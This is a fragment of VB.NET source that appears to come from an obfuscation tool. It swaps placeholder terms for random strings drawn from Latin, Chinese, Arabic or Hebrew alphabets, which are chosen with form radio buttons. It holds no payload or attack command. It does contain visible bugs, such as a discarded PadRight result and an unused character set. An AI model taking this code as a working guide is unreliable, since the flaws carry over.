        term(80) = "222081"
        term(81) = "222082"
        term(82) = "222083"
        term(83) = "222084"
        term(84) = "222085"
        term(85) = "222086"
        term(86) = "222087"
        term(87) = "222088"
        term(88) = "222089"

        Dim tmpStr As String
        tmpStr = input
        Dim random As String = random25()
        Dim hash(88) As String
        Dim hashtmp As String

        Dim f As Integer = 0 + 1
        For b As Integer = 0 To 88
            hashtmp = Mid(random, f, length)
            If hashtmp.Length > length Then
                hashtmp = Mid(hashtmp, 1, length)
            ElseIf hashtmp.Length < length Then
                hashtmp.PadRight(length, "x")
            End If
            hash(b) = hashtmp
            f = f + length
        Next

        For i As Integer = 0 To 88
            While tmpStr.Contains(term(i))
                tmpStr = Replace(tmpStr, term(i), hash(i))
            End While
        Next
        Return tmpStr

    End Function
    Shared r As New Random
    Shared Function random25() As String

        Dim eng As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        Dim chn As String = "艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德"
        Dim heb As String = "אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת"
        Dim arb As String = "ابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي"
        Dim mix As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת"
        Dim s As String

        If Form1.ObscurationEngRadioButton.Checked Then
            s = eng
        ElseIf Form1.ObscurationChiRadioButton.Checked Then
            s = chn
        ElseIf Form1.ObscurationArbRadioButton.Checked Then
            s = arb

        End If

        Dim sb As New StringBuilder
            For i As Integer = 1 To length * 92
                Dim idx As Integer = r.Next(0, 177)
                sb.Append(s.Substring(idx, 1))
            Next
            Return sb.ToString
    End Function

End Class
#End Region